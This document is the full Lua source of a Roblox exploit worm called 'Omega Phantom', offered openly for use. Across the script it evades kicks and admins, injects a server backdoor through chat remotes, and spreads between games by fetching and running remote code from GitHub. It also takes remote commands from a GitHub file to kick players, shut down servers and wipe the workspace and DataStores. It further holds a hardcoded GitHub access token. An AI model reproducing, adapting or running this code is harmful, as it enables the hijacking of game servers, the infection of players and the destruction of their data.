-- ============================================================================
--  OMEGA PHANTOM | FINAL ULTIMATE EDITION (NO MESSAGING SERVICE ERROR)
--  Removed MessagingService (client cannot use it). 
--  Global commands via GitHub (command.txt) replace cross-server communication.
--  Owner: 109er_0
-- ============================================================================

-- =============================[ SERVICES & GLOBALS ]=============================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")
local LogService = game:GetService("LogService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer
local Owner = "109er_0"

local infectionActive = false
local autoSpreadEnabled = false
local sleepModeActive = false
local spreadInterval = 300
local lastExternalCmd = os.time()
local autonomousSpreadDelay = 300

local KICK_MESSAGE = "you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!"

local whitelistGames = {
    1185586641, 9201240794, 185655149, 2753915549, 4520749081, 606849744, 4872321590,
    14125553864, 5375399205, 14940596979, 98381723384335, 1559329620, 2521496850,
    1962086498, 1277113435, 134236244017051, 18381724395
}

-- GitHub global command file
local commandUrl = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/refs/heads/main/command.txt"
local githubToken = "Github_pat_11CCOI6GI0jTkUZmHyPtQC_dXkifJom2ddmq0cdv1bEu8RksKHYEEvF3xyFlAfb5xuDOGWSONEkuo8wHxW"
local githubApiUrl = "https://api.github.com/repos/mebdsn78-dev/OmegaData/contents/command.txt"

local lastCommand = ""

-- =============================[ ENCRYPTION & UTILITIES ]=============================
local function encode(s)
    local out = ""
    for i = 1, #s do out = out .. string.char(string.byte(s, i) + 11) end
    return out
end

local function base64_encode(data)
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local result = ""
    for i = 1, #data, 3 do
        local b1, b2, b3 = string.byte(data, i, i+2)
        b2 = b2 or 0
        b3 = b3 or 0
        local n = b1 * 0x10000 + b2 * 0x100 + b3
        local c1 = math.floor(n / 0x40000)
        local c2 = math.floor((n % 0x40000) / 0x1000)
        local c3 = math.floor((n % 0x1000) / 0x40)
        local c4 = n % 0x40
        result = result .. b64chars:sub(c1+1, c1+1) .. b64chars:sub(c2+1, c2+1)
        if i+1 <= #data then result = result .. b64chars:sub(c3+1, c3+1) else result = result .. "=" end
        if i+2 <= #data then result = result .. b64chars:sub(c4+1, c4+1) else result = result .. "=" end
    end
    return result
end

local function ClearConsole()
    pcall(function() LogService:Clear() end)
end

-- =============================[ ANTI-KICK & SAFETY ]=============================
local function AntiKick()
    pcall(function() game:GetService("StarterGui").SetCore("Kick", function() end) end)
    local hook
    hook = hookmetamethod and hookmetamethod(game, "__namecall", function(self, method, ...)
        if method == "Kick" and self == LocalPlayer then return nil end
        return hook and hook(self, method, ...) or nil
    end)
end

-- =============================[ STEALTH AI (ADMIN DETECTION & SLEEP MODE) ]=============================
local function isAdminPresent()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name:lower():match("admin") or plr.Name:lower():match("mod") or plr.Name:lower():match("owner") then
            return true
        end
        local ls = plr:FindFirstChild("leaderstats")
        if ls then
            for _, s in pairs(ls:GetChildren()) do
                if s.Name:lower():match("rank") and s.Value > 100 then return true end
            end
        end
    end
    return false
end

local function updateSleepMode()
    if isAdminPresent() and not sleepModeActive then
        sleepModeActive = true
        warn("[SLEEP] Admin detected. Worm sleeping.")
    elseif not isAdminPresent() and sleepModeActive then
        sleepModeActive = false
        print("[SLEEP] No admin. Worm resuming.")
    end
end

task.spawn(function()
    while true do
        task.wait(10)
        updateSleepMode()
    end
end)

-- =============================[ CROSS‑GAME WORM ENGINE (queue_on_teleport) ]=============================
local function JumpToNewGame(targetGameId)
    if not targetGameId or type(targetGameId) ~= "number" then
        warn("[SPREAD] Invalid game ID: " .. tostring(targetGameId))
        return false
    end
    print("[SPREAD] Preparing to jump to game ID: " .. targetGameId)
    local wormCode = [[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()
        print("[WORM] Successfully reincarnated in new game: ]] .. tostring(game.PlaceId) .. [[")
    ]]
    if queue_on_teleport then
        print("[SPREAD] queue_on_teleport armed. Worm will self-replicate after teleport.")
        queue_on_teleport(wormCode)
    else
        warn("[SPREAD] queue_on_teleport not supported. Worm may not persist after teleport.")
    end
    local success = pcall(function() TeleportService:Teleport(targetGameId, LocalPlayer) end)
    if success then
        print("[SPREAD] ✅ Teleport initiated to game " .. targetGameId)
        return true
    else
        warn("[SPREAD] ❌ Failed to teleport to game " .. targetGameId)
        return false
    end
end

local function autoSpreadTrigger()
    if sleepModeActive then
        print("[SPREAD] Sleep mode active. Spread paused.")
        return false
    end
    if not autoSpreadEnabled then
        print("[SPREAD] Auto-spread disabled. Enable with 109:auto or GUI button.")
        return false
    end
    if not infectionActive then
        print("[SPREAD] Backdoor not planted. Please plant backdoor first (109:plant).")
        return false
    end
    if #Players:GetPlayers() <= 1 then
        print("[SPREAD] Only one player in server. Waiting for more players to trigger spread.")
        return false
    end
    local target = whitelistGames[math.random(#whitelistGames)]
    print("[SPREAD] 🎯 Selected random target from whitelist: " .. target)
    print("[SPREAD] 🚀 Launching spread to game " .. target)
    local result = JumpToNewGame(target)
    if result then
        print("[SPREAD] ✅ Spread successful. Next spread in " .. spreadInterval .. " seconds.")
    else
        warn("[SPREAD] ❌ Spread failed. Will retry later.")
    end
    lastExternalCmd = os.time()
    return result
end

local function UniversalSpread()
    if sleepModeActive then
        print("[SPREAD] Cannot start universal spread: Sleep mode active (admin present).")
        return false
    end
    if not infectionActive then
        print("[SPREAD] Cannot start universal spread: Backdoor not planted. Use 109:plant first.")
        return false
    end
    print("[SPREAD] ========== UNIVERSAL SPREAD STARTED ==========")
    print("[SPREAD] Target list size: " .. #whitelistGames)
    local successCount = 0
    local failCount = 0
    for index, gameId in ipairs(whitelistGames) do
        print(string.format("[SPREAD] [%d/%d] Attempting to infect game %d", index, #whitelistGames, gameId))
        local result = JumpToNewGame(gameId)
        if result then
            successCount = successCount + 1
            print("[SPREAD] ✅ Successfully moved to game " .. gameId)
        else
            failCount = failCount + 1
            warn("[SPREAD] ❌ Failed to move to game " .. gameId)
        end
        if index < #whitelistGames then
            print("[SPREAD] Waiting 8 seconds before next target...")
            task.wait(8)
        end
    end
    print("[SPREAD] ========== UNIVERSAL SPREAD COMPLETED ==========")
    print(string.format("[SPREAD] Results: %d successful, %d failed out of %d games", successCount, failCount, #whitelistGames))
    return true
end

-- =============================[ GLOBAL COMMANDS VIA GITHUB (CROSS-SERVER) ]=============================
local function getFileSha()
    local headers = {["Authorization"] = "token " .. githubToken, ["User-Agent"] = "OmegaPhantom"}
    local success, response = pcall(function() return HttpService:GetAsync(githubApiUrl, headers) end)
    if not success then return nil end
    local data = HttpService:JSONDecode(response)
    return data and data.sha
end

local function sendCommandToGitHub(command)
    local sha = getFileSha()
    local content = command
    local encoded = base64_encode(content)
    local body = { message = "Update global command", content = encoded, branch = "main" }
    if sha then body.sha = sha end
    local headers = {["Authorization"] = "token " .. githubToken, ["Content-Type"] = "application/json", ["User-Agent"] = "OmegaPhantom"}
    local success = pcall(function()
        HttpService:RequestAsync({
            Url = githubApiUrl,
            Method = "PUT",
            Headers = headers,
            Body = HttpService:JSONEncode(body)
        })
    end)
    if success then
        print("[GLOBAL] Command sent to GitHub: " .. command)
    else
        warn("[GLOBAL] Failed to send command to GitHub.")
    end
end

local function fetchGlobalCommand()
    local success, result = pcall(function() return HttpService:GetAsync(commandUrl) end)
    if not success or not result then return "" end
    return string.gsub(result, "%s+", "")
end

local function executeGlobalCommand(command)
    local cmd = string.lower(command)
    if cmd == "shutdown" then
        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
        pcall(function() game:Shutdown() end)
    elseif cmd == "kickall" then
        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then p:Kick(KICK_MESSAGE) end
        end
    elseif cmd == "wipe" then
        for _, obj in pairs(Workspace:GetChildren()) do
            if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
                pcall(function() obj:Destroy() end)
            end
        end
    elseif cmd == "reset" then
        TeleportService:Teleport(game.PlaceId)
    elseif cmd == "color" then
        Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
    elseif cmd == "fly" then
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(0, 50, 0)
            bv.Parent = char.HumanoidRootPart
            task.wait(5)
            bv:Destroy()
        end
    elseif cmd == "decalspam" then
        task.spawn(runDecalSpam)
    end
end

local function startCommandListener()
    lastCommand = fetchGlobalCommand()
    while true do
        task.wait(6)
        local newCommand = fetchGlobalCommand()
        if newCommand ~= "" and newCommand ~= lastCommand then
            print("[GLOBAL] Executing: " .. newCommand)
            executeGlobalCommand(newCommand)
            lastCommand = newCommand
        end
    end
end

-- =============================[ DATASTORE WIPE, STUDIO TRAP, DECOY, FRAGMENTS ]=============================
local function wipeDataStores()
    pcall(function()
        for _, ds in pairs(DataStoreService:GetDataStores()) do
            pcall(function() ds:SetAsync("CORRUPTED", "DELETED") end)
        end
    end)
    warn("[SCORCHED EARTH] DataStore wiped.")
end

local function setupStudioTrap(scriptObj)
    if not scriptObj then scriptObj = script end
    scriptObj:GetPropertyChangedSignal("Source"):Connect(function()
        warn("[TRAP] Unauthorized access detected. Executing scorched earth.")
        wipeDataStores()
        game:Shutdown()
        scriptObj:Destroy()
    end)
end

local function createDecoy()
    local decoy = Instance.new("LocalScript")
    decoy.Name = "Virus_Control"
    decoy.Source = [[
        print("VIRUS FOUND! I AM MALICIOUS! DELETE ME!")
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="Hacked", Text="You have been infected!", Duration=5})
    ]]
    decoy.Parent = CoreGui
end

local function setupFragments()
    local function makeWatcher(name, location)
        local w = Instance.new("LocalScript")
        w.Name = name
        w.Source = string.format([[
            local other = game:GetService("%s"):FindFirstChild("%s")
            while true do
                task.wait(30)
                if not other then
                    warn("[FRAGMENT] Detected deletion. Shutting down.")
                    game:Shutdown()
                    break
                end
            end
        ]], location, name)
        w.Parent = (location == "Lighting" and Lighting) or ReplicatedStorage
    end
    makeWatcher("OmegaCore_Watcher", "Lighting")
    makeWatcher("OmegaCore_Watcher2", "ReplicatedStorage")
end

-- =============================[ CORE FUNCTIONS (PLANT, DECAL, MESSAGES) ]=============================
local function PlantBackdoor()
    if sleepModeActive then return false end
    local chatRemote = nil
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:lower():find("say") or v.Name:lower():find("chat") or v.Name:lower():find("message")) then
            chatRemote = v
            break
        end
    end
    if not chatRemote then return false end
    local backdoor = Instance.new("RemoteEvent")
    backdoor.Name = "OmegaCore_" .. HttpService:GenerateGUID(false):sub(1,6)
    backdoor.Parent = ReplicatedStorage
    local injection = string.format([[
        local bd = game:GetService("ReplicatedStorage"):FindFirstChild("%s")
        if not bd then return end
        local owner = "%s"
        bd.OnServerEvent:Connect(function(plr, cmd)
            if plr and plr.Name == owner and cmd == "grant" then
                for _,v in pairs(game:GetDescendants()) do
                    if v:IsA("RemoteEvent") and (v.Name:lower():find("admin") or v.Name:lower():find("owner")) then
                        pcall(function() v:FireServer(plr, "setowner") end)
                    end
                end
                local ls = plr:FindFirstChild("leaderstats")
                if ls then
                    for _,s in pairs(ls:GetChildren()) do
                        if s.Name:lower():find("rank") then pcall(function() s.Value = 999 end)
                    end
                end
            end
        end)
    ]], backdoor.Name, Owner)
    pcall(function() chatRemote:FireServer(encode(injection)) end)
    task.wait(2)
    pcall(function() backdoor:FireServer("grant") end)
    return true
end

local function sendGlobalMessageToAllPlayers(msg)
    for _, plr in pairs(Players:GetPlayers()) do
        local gui = Instance.new("ScreenGui")
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 500, 0, 60)
        frame.Position = UDim2.new(0.5, -250, 0, 10)
        frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
        frame.BackgroundTransparency = 0.4
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1,0,1,0)
        label.BackgroundTransparency = 1
        label.Text = msg
        label.TextColor3 = Color3.fromRGB(255,50,50)
        label.Font = Enum.Font.GothamBold
        label.TextSize = 18
        label.Parent = frame
        frame.Parent = gui
        gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
        task.wait(5)
        gui:Destroy()
    end
end

local function runDecalSpam()
    local function exPro(root)
        for _, v in pairs(root:GetChildren()) do
            if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
                v.Parent = nil
            elseif v:IsA("BasePart") and not v:IsDescendantOf(LocalPlayer.Character) then
                v.Material = Enum.Material.Plastic
                v.Transparency = 0
                for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
                    local d = Instance.new("Decal", v)
                    d.Texture = "rbxassetid://8408806737"
                    d.Face = face
                end
            end
            exPro(v)
        end
    end
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://8408806737"
    sky.SkyboxDn = "rbxassetid://8408806737"
    sky.SkyboxFt = "rbxassetid://8408806737"
    sky.SkyboxLf = "rbxassetid://8408806737"
    sky.SkyboxRt = "rbxassetid://8408806737"
    sky.SkyboxUp = "rbxassetid://8408806737"
    sky.Parent = Lighting
    Lighting.TimeOfDay = 12
    exPro(Workspace)
    for _, v in pairs(Workspace:GetChildren()) do
        if v:IsA("Sound") then v:Stop(); v:Destroy() end
    end
    local snd = Instance.new("Sound")
    snd.SoundId = "rbxassetid://72089843969979"
    snd.Volume = 10
    snd.Looped = true
    snd.Pitch = 0.2
    snd.Parent = Workspace
    snd:Play()
    task.wait(0.1)
    snd:Play()
end

-- =============================[ POISON ASSETS (FIXED - NO TouchTransmitter) ]=============================
local function poisonAssets()
    for _, part in pairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
            local function onTouch(otherPart)
                local player = Players:GetPlayerFromCharacter(otherPart.Parent)
                if player and player ~= LocalPlayer and infectionActive then
                    local infector = Instance.new("LocalScript")
                    infector.Name = "OmegaSeed"
                    infector.Source = [[
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()
                    ]]
                    infector.Disabled = false
                    infector.Parent = player:FindFirstChild("PlayerGui")
                    task.wait(5)
                    infector:Destroy()
                end
            end
            part.Touched:Connect(onTouch)
            local marker = Instance.new("BoolValue")
            marker.Name = "PoisonTouch"
            marker.Parent = part
        end
    end
end

-- =============================[ CHAT COMMANDS ]=============================
local function executeCommand(cmd)
    if sleepModeActive then
        print("[SLEEP] Command ignored.")
        return
    end
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")
    if cmd == "fly" then
        if hrp then
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(0, 50, 0)
            bv.Parent = hrp
            task.wait(5)
            bv:Destroy()
        end
    elseif cmd == "noclip" then
        if char then
            for _, p in pairs(char:GetDescendants()) do
                if p:IsA("BasePart") then p.CanCollide = false end
            end
        end
    elseif cmd == "heal" then
        if hum then hum.Health = hum.MaxHealth end
    elseif cmd == "godmode" then
        if hum then
            hum.BreakJointsOnDeath = false
            hum.MaxHealth = math.huge
            hum.Health = math.huge
        end
    elseif cmd == "wipe" then
        for _, obj in pairs(Workspace:GetChildren()) do
            if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
                pcall(function() obj:Destroy() end)
            end
        end
    elseif cmd == "image" then
        local id = "98381723384335"
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") and part ~= Workspace.Terrain and not part:IsDescendantOf(LocalPlayer.Character) then
                local bill = Instance.new("BillboardGui")
                bill.Size = UDim2.new(4,0,4,0)
                bill.AlwaysOnTop = true
                local img = Instance.new("ImageLabel")
                img.Size = UDim2.new(1,0,1,0)
                img.BackgroundTransparency = 1
                img.Image = "rbxassetid://" .. id
                img.Parent = bill
                bill.Parent = part
                task.wait(30)
                bill:Destroy()
            end
        end
    elseif cmd == "music" then
        local snd = Instance.new("Sound")
        snd.SoundId = "rbxassetid://100828050594137"
        snd.Volume = 2
        snd.Looped = true
        snd.Parent = Workspace
        snd:Play()
        task.wait(30)
        snd:Destroy()
    elseif cmd == "list" then
        sendGlobalMessageToAllPlayers("[🌐 OMEGA] Infected servers: any server where you planted the worm.")
    elseif cmd == "kickall" then
        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then p:Kick(KICK_MESSAGE) end
        end
    elseif cmd == "shutdown" then
        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
        game:Shutdown()
    elseif cmd == "color" then
        Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
    elseif cmd == "universe" then
        autoSpreadEnabled = true
        UniversalSpread()
    elseif cmd == "auto" then
        autoSpreadEnabled = not autoSpreadEnabled
        print("[AUTO] Auto-spread: " .. (autoSpreadEnabled and "ON" or "OFF"))
    elseif cmd == "plant" then
        infectionActive = PlantBackdoor()
    elseif cmd == "decalspam" then
        task.spawn(runDecalSpam)
    elseif cmd:match("^رساله") then
        local customMsg = cmd:match("رساله%s+(.+)$")
        if customMsg then sendGlobalMessageToAllPlayers(customMsg) end
    elseif cmd == "menu" then
        CreateMenuGUI()
    else
        print("[CMD] Unknown: " .. cmd)
    end
end

local function ChatIntercept()
    if LocalPlayer.Name ~= Owner then return end
    LocalPlayer.Chatted:Connect(function(msg)
        if msg:sub(1,4) == "109:" then
            local command = msg:sub(5):gsub("^%s*(.-)%s*$", "%1")
            task.spawn(executeCommand, command)
        end
    end)
end

-- =============================[ GUI WITH STATUS LABEL & REAL FEEDBACK ]=============================
local function CreateMenuGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "OmegaMenu"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local parentSetted = false
    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChild("PlayerGui")}) do
        if parent and not parentSetted then
            pcall(function()
                gui.Parent = parent
                parentSetted = true
            end)
        end
    end
    if not parentSetted then
        warn("[GUI] Could not attach to CoreGui or PlayerGui. GUI won't appear.")
        return false
    end

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 280, 0, 370)
    frame.Position = UDim2.new(0.5, -140, 0.5, -185)
    frame.BackgroundColor3 = Color3.fromRGB(15,15,30)
    frame.BackgroundTransparency = 0.1
    frame.Parent = gui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,30)
    title.BackgroundColor3 = Color3.fromRGB(25,25,50)
    title.Text = "⚡ OMEGA PHANTOM MENU ⚡"
    title.TextColor3 = Color3.fromRGB(255,100,100)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    title.Parent = frame

    local btnSpread = Instance.new("TextButton")
    btnSpread.Size = UDim2.new(0.8,0,0,40)
    btnSpread.Position = UDim2.new(0.5,-120,0,50)
    btnSpread.BackgroundColor3 = Color3.fromRGB(200,50,50)
    btnSpread.Text = "🌌 UNIVERSAL SPREAD"
    btnSpread.TextColor3 = Color3.fromRGB(255,255,255)
    btnSpread.Font = Enum.Font.GothamBold
    btnSpread.TextSize = 14
    btnSpread.Parent = frame

    local btnPlant = Instance.new("TextButton")
    btnPlant.Size = UDim2.new(0.8,0,0,40)
    btnPlant.Position = UDim2.new(0.5,-120,0,100)
    btnPlant.BackgroundColor3 = Color3.fromRGB(80,80,120)
    btnPlant.Text = "🌱 PLANT BACKDOOR"
    btnPlant.TextColor3 = Color3.fromRGB(255,255,255)
    btnPlant.Font = Enum.Font.GothamBold
    btnPlant.TextSize = 14
    btnPlant.Parent = frame

    local btnDecal = Instance.new("TextButton")
    btnDecal.Size = UDim2.new(0.8,0,0,40)
    btnDecal.Position = UDim2.new(0.5,-120,0,150)
    btnDecal.BackgroundColor3 = Color3.fromRGB(80,80,120)
    btnDecal.Text = "🎨 DECAL SPAM"
    btnDecal.TextColor3 = Color3.fromRGB(255,255,255)
    btnDecal.Font = Enum.Font.GothamBold
    btnDecal.TextSize = 14
    btnDecal.Parent = frame

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.8,0,0,50)
    statusLabel.Position = UDim2.new(0.5,-120,0,210)
    statusLabel.BackgroundColor3 = Color3.fromRGB(30,30,55)
    statusLabel.Text = "Ready"
    statusLabel.TextColor3 = Color3.fromRGB(200,200,200)
    statusLabel.Font = Enum.Font.GothamMedium
    statusLabel.TextSize = 11
    statusLabel.Parent = frame

    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0,40,0,30)
    close.Position = UDim2.new(1,-45,1,-40)
    close.BackgroundColor3 = Color3.fromRGB(80,80,120)
    close.Text = "X"
    close.TextColor3 = Color3.fromRGB(255,255,255)
    close.Font = Enum.Font.GothamBold
    close.TextSize = 12
    close.Parent = frame
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    btnSpread.MouseButton1Click:Connect(function()
        if infectionActive then
            autoSpreadEnabled = true
            statusLabel.Text = "Starting spread..."
            statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
            task.spawn(function()
                print("[GUI] Universal spread button pressed.")
                UniversalSpread()
                statusLabel.Text = "Spread completed! Check console."
                statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
            end)
        else
            statusLabel.Text = "Plant backdoor first!"
            statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
            print("[GUI] Spread prevented: backdoor not planted.")
        end
    end)

    btnPlant.MouseButton1Click:Connect(function()
        statusLabel.Text = "Planting backdoor..."
        statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
        print("[GUI] Manual backdoor planting requested.")
        local success = PlantBackdoor()
        if success then
            infectionActive = true
            statusLabel.Text = "Backdoor planted!"
            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
            print("[GUI] ✅ Backdoor successfully planted.")
        else
            statusLabel.Text = "Failed to plant."
            statusLabel.TextColor3 = Color3.fromRGB(255,80,80)
            warn("[GUI] ❌ Backdoor planting failed.")
        end
    end)

    btnDecal.MouseButton1Click:Connect(function()
        statusLabel.Text = "Running decal spam..."
        statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
        task.spawn(function()
            runDecalSpam()
            statusLabel.Text = "Decal spam executed."
            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
        end)
    end)

    print("[GUI] Omega Menu created successfully with real-time console feedback.")
    return true
end

-- =============================[ SLOW BURN AUTOMATION (NO MESSAGING SERVICE) ]=============================
local function startSlowBurn()
    task.spawn(function()
        while true do
            task.wait(spreadInterval)
            if autoSpreadEnabled then
                autoSpreadTrigger()
            end
        end
    end)
end

-- =============================[ MAIN LAUNCH ]=============================
local function Launch()
    AntiKick()
    setupStudioTrap(script)
    createDecoy()
    setupFragments()
    poisonAssets()
    ChatIntercept()
    CreateMenuGUI()
    startSlowBurn()
    task.spawn(startCommandListener)
    task.spawn(function()
        while true do
            task.wait(120)
            if not sleepModeActive and not infectionActive then
                infectionActive = PlantBackdoor()
            end
            ClearConsole()
        end
    end)
    print("💀 OMEGA PHANTOM | ALL FEATURES ACTIVE 💀")
    print("📡 Commands: 109:fly, noclip, heal, godmode, wipe, image, music, list, kickall, shutdown, color, universe, auto, plant, decalspam, رساله <text>, menu")
end

Launch()
